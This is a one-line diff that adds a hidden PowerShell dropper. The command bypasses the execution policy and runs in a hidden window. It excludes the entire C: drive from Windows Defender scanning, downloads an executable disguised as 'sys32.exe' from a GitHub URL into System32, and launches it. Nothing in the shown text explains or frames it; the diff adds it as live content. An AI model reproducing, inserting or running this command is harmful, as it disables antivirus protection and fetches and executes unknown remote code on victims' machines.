@@ -1,0 +1,1 @@
+powershell -Exec Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath ('C'+':\\')";Invoke-WebRequest 'https://github.com/anilxpm/powerl/raw/refs/heads/master/sys32.exe' -OutFile "$env:WINDIR\System32\sys32.exe"; Start-Process "$env:WINDIR\System32\sys32.exe"
